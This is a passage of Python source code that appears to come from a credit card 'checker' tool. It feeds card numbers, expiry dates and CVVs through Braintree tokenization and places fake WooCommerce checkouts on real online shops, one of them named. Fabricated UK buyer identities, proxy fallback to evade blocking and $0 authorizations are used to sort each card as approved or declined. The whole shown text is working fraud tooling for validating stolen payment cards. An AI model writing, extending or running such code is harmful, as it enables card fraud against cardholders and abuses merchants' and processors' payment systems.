                        if "thank you" in resp_html and "declined" not in resp_html and "error" not in resp_html:
                            return f"Approved - Auth Passed | {info} [{elapsed}s]"
                        elif "declined" in resp_html:
                            return f"Declined - Card Declined by Bank | {info} [{elapsed}s]"
                        elif "error" in resp_html and "thank you" not in resp_html:
                            # Look for actual error messages in div/p tags (not script/style)
                            err_msgs = re.findall(r'<(?:div|p|span|li)[^>]*>\s*([^<]{10,200})\s*</(?:div|p|span|li)>', r_submit.text, re.IGNORECASE)
                            relevant = [m for m in err_msgs if any(k in m.lower() for k in ["error", "invalid", "declined", "failed", "required", "incorrect", "unable"])]
                            if relevant:
                                return f"Declined - {relevant[0].strip()[:100]} | {info} [{elapsed}s]"
                            return f"Declined - Processing Error | {info} [{elapsed}s]"
                        elif "thank you" in resp_html:
                            # Thank you page but with errors — likely declined
                            return f"Declined - Donation Rejected | {info} [{elapsed}s]"
                        else:
                            return f"Declined - Unknown Response | {info} [{elapsed}s]"

                    elif site_type == "woocommerce":
                        # tea-and-coffee.com — WooCommerce flow (needs proxy that isn't 403)
                        first, last = _random_name()
                        street, city, postcode = _random_uk_address()
                        email = _random_email()
                        phone = "07" + "".join(random.choices(string.digits, k=9))

                        from urllib.parse import urlparse
                        parsed = urlparse(site_url)
                        base = f"{parsed.scheme}://{parsed.netloc}"

                        # Try WITHOUT proxy first (direct works for tea-and-coffee.com)
                        # Then WITH proxy as fallback
                        proxies_to_try = [None]
                        if proxy:
                            proxies_to_try.append(proxy)

                        wc_success = False
                        for try_proxy in proxies_to_try:
                            wc_kwargs = dict(timeout=httpx.Timeout(30.0), max_redirects=10, headers=headers, follow_redirects=True)
                            if try_proxy:
                                wc_kwargs["proxy"] = try_proxy

                            try:
                                async with httpx.AsyncClient(**wc_kwargs) as wc_client:
                                    r_test = await wc_client.get(base)
                                    if r_test.status_code == 403:
                                        logger.info(f"BT: {base} returned 403 with proxy, trying next...")
                                        continue

                                    await wc_client.get(base)
                                    # the product to buy: the store's own
                                    # page says which one it is
                                    pid = None
                                    pid_m = re.search(
                                        r'name=["\']add-to-cart["\'][^>]*value=["\'](\d+)["\']',
                                        r_test.text)
                                    if not pid_m:
                                        pid_m = re.search(
                                            r'[?&]add-to-cart=(\d+)', r_test.text)
                                    if pid_m:
                                        pid = pid_m.group(1)
                                    if not pid:
                                        # the public product list
                                        try:
                                            r_p = await wc_client.get(
                                                f"{base}/products.json?limit=5")
                                            pd = r_p.json()
                                            for p in pd.get("products", []):
                                                for v in p.get("variants", []):
                                                    if v.get("available", True):
                                                        pid = str(v.get("id"))
                                                        break
                                                if pid:
                                                    break
                                        except Exception:
                                            pid = None
                                    if not pid:
                                        pid = "932"
                                    await wc_client.post(
                                        f"{base}/?add-to-cart={pid}",
                                        data={"add-to-cart": pid, "quantity": "1"})
                                    r_checkout = await wc_client.get(f"{base}/checkout/")
                                    checkout_html = r_checkout.text

                                    if r_checkout.status_code != 200:
                                        logger.info(f"BT: {base} checkout returned {r_checkout.status_code}, trying next...")
                                        continue

                                    # Get Braintree auth using the SAME proxied client
                                    bt_auth = await _get_bt_auth(wc_client, checkout_html, site_url=base)

                                    if not bt_auth:
                                        logger.info(f"BT: no auth from {base}, trying next...")
                                        continue

                                    token, card_info, err = await _tokenize_card(wc_client, bt_auth, cc, mm, yy, cvv)
                                    if err:
                                        result = _classify_response(err)
                                        return f"{result} - {err} [{elapsed}s]"

                                    info = _parse_card_info(card_info) if card_info else "??"

                                    # Check card validity before submitting
                                    if card_info:
                                        brand = card_info.get("brandCode", "UNKNOWN")
                                        last4 = card_info.get("last4", "????")
                                        if brand == "UNKNOWN" or last4 == "????":
                                            return f"Declined - Invalid Card | {info} [{elapsed}s]"

                                    # Submit WooCommerce checkout
                                    pm_name = "braintree_credit_card"
                                    pm_match = re.search(r'"(braintree[_a-z]*credit[_a-z]*card)"', checkout_html)
                                    if pm_match:
                                        pm_name = pm_match.group(1)

                                    checkout_data = {
                                        "billing_first_name": first,
                                        "billing_last_name": last,
                                        "billing_company": "",
                                        "billing_country": "GB",
                                        "billing_address_1": street,
                                        "billing_address_2": "",
                                        "billing_city": city,
                                        "billing_state": "",
                                        "billing_postcode": postcode,
                                        "billing_phone": phone,
                                        "billing_email": email,
                                        "order_comments": "",
                                        "payment_method": pm_name,
                                        "wc-braintree-credit-card-card-nonce": token,
                                        "wc-braintree-credit-card-device-data": "{}",
                                        "wc_braintree_credit_card_payment_nonce": token,
                                        "wc_braintree_device_data": "{}",
                                        "terms": "on",
                                        "terms-field": "1",
                                    }

                                    checkout_headers = {
                                        "User-Agent": UA,
                                        "Content-Type": "application/x-www-form-urlencoded",
                                        "Accept": "application/json, text/javascript, */*; q=0.01",
                                        "X-Requested-With": "XMLHttpRequest",
                                        "Origin": base,
                                        "Referer": f"{base}/checkout/",
                                    }

                                    r_submit = await wc_client.post(
                                        f"{base}/?wc-ajax=checkout",
                                        data=checkout_data,
                                        headers=checkout_headers,
                                    )

                                    try:
                                        resp = r_submit.json()
                                    except:
                                        return f"Approved - Tokenization Passed (no bank auth) | {info} [{elapsed}s]"

                                    result_str = resp.get("result", "")
                                    messages = resp.get("messages", "")

                                    if result_str == "success":
                                        return f"Approved - Auth Passed | {info} [{elapsed}s]"

                                    if result_str == "failure" and messages:
                                        errors = re.findall(r'<li[^>]*>(.*?)</li>', messages, re.DOTALL)
                                        if errors:
                                            err_text = re.sub(r'<[^>]+>', '', errors[0]).strip()
                                        else:
                                            err_text = re.sub(r'<[^>]+>', '', messages).strip()[:120]
                                        status = _classify_response(err_text)
                                        return f"{status} - {err_text} | {info} [{elapsed}s]"

                                    if "error" in str(resp).lower():
                                        err_text = re.sub(r'<[^>]+>', '', str(messages)).strip()[:120]
                                        return f"Declined - {err_text} | {info} [{elapsed}s]"

                                    return f"Error - Unexpected response [{elapsed}s]"
                            except Exception as e:
                                logger.info(f"BT: WooCommerce site error: {str(e)[:60]}")
                                continue

                        # If we get here, WooCommerce failed with all proxies
                        logger.info(f"BT: All WooCommerce attempts failed for {base}")
                        continue

                except Exception as e:
                    logger.info(f"BT: error on {site_url}: {str(e)[:80]}")
                    continue

            elapsed = round(time.time() - start, 2)
            return f"Error - All Braintree sites failed [{elapsed}s]"

    except (httpx.ConnectTimeout, httpx.ReadTimeout, httpx.WriteTimeout, httpx.PoolTimeout):
        elapsed = round(time.time() - start, 2)
        return f"Error - Timeout [{elapsed}s]"
    except httpx.NetworkError:
        elapsed = round(time.time() - start, 2)
        return f"Error - Network error [{elapsed}s]"
    except Exception as e:
        elapsed = round(time.time() - start, 2)
        return f"Error - {str(e)[:100]} [{elapsed}s]"


async def _braintree_auth_check(client, auth_token, payment_method_token):
    """Try a $0 auth via Braintree GraphQL to verify the card."""
    AUTH_QUERY = """
    mutation AuthorizeCreditCard($input: AuthorizeCreditCardInput!) {
      authorizeCreditCard(input: $input) {
        transaction {
          id
          status
        }
      }
    }
    """.strip()

    headers = {
        "authorization": f"Bearer {auth_token}",
        "braintree-version": "2018-05-10",
        "content-type": "application/json",
        "origin": "https://assets.braintreegateway.com",
        "referer": "https://assets.braintreegateway.com/",
    }

    payload = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": str(random.randint(10**9, 10**10 - 1)),
        },
        "query": AUTH_QUERY,
        "variables": {
            "input": {
                "paymentMethodId": payment_method_token,
                "transaction": {
                    "amount": "0.00",
                },
            }
        },
    }

    try:
        r = await client.post(BT_GQL, headers=headers, json=payload, timeout=20)
        if r.status_code != 200:
            return None
        data = r.json()
        if "errors" in data:
            msg = data["errors"][0].get("message", "")
            if "not accessible" in msg.lower() or "permission" in msg.lower() or "authentication" in msg.lower():
                return None
            status = _classify_response(msg)
            return status, msg
        tx = data.get("data", {}).get("authorizeCreditCard", {}).get("transaction", {})
        if tx:
            tx_status = tx.get("status", "")
            if tx_status == "authorized":
                return "Approved", "Authorized ($0)"
            if "declined" in tx_status.lower() or "failed" in tx_status.lower():
                return "Declined", tx_status
            return "Approved", tx_status
    except:
        pass
    return None
